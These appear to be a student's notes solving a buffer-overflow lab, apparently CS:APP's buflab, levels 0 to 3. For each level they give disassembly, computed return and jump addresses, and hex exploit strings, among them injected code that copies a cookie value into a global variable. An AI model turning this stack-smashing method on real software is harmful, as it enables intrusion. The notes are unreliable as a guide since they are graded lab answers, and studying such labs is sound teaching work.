int cookii=0x99999999;
int global=0;
void main(){
	global=cookii;
}



 80482f4:	55                   	push   %ebp
 8048304:	a1 cc 93 04 08       	mov    0x80493cc,%eax
 8048309:	a3 d0 93 04 08       	mov    %eax,0x80493d0
 804830e:	c9                   	leave  
 804830f:	c3                   	ret    




r -t SA12226150+SA12226166 < so

level3:
bfffbbbc:	a1 cc a1 04 08       	mov    0x804a1cc,%eax  //copy cookii to eax
bfffbbc1:	bd e8 bb ff bf      	mov    $0xbfffbbe8,%ebp //copy the old value to ebp
bfffbbc6: c3                   	ret 

the jump address is 0xbfffbbbc  bcbbffbf
second jump address=0x0804901e  1e900408
the old ebx value is 0xbfffbbe4;  e4bbffbf  between return and 8byte
the exploit code is a1cca10408bde8bbffbfc3e0bbffbfc3bcbbffbf1e900408


level2:
jump address=0xbfffbbbc  bcbbffbf
second jump address=0x08048d60  608d0408
the exloit code is  a1cca10408a3dca10408c308208e0408bcbbffbf608d0408
global_value address=0x804a1dc
cookii address=0x804a1cc
so the exploit code is a1cca10408a3dca10408c308208e0408bcbbffbf608d0408
bfffbbbc:	a1 cc a1 04 08       	mov    0x804a1cc,%eax  //copy cookii to global_value
bfffbbc1:	a3 dc a1 04 08       	mov    %eax,0x804a1dc
bfffbbc6: c3                   	ret 
total 11byte
a1cca10408a3dca10408c3

level1:
jump address=0x08048dc0  c08d0408
before the argument there is 4 byte between and return address
so the exploit code is 208e0408208e0408208e0408208e0408c08d0408




level0:
jump address=0x08048e20  208e0408
the exploit string is 208e0408208e0408208e0408208e0408208e0408
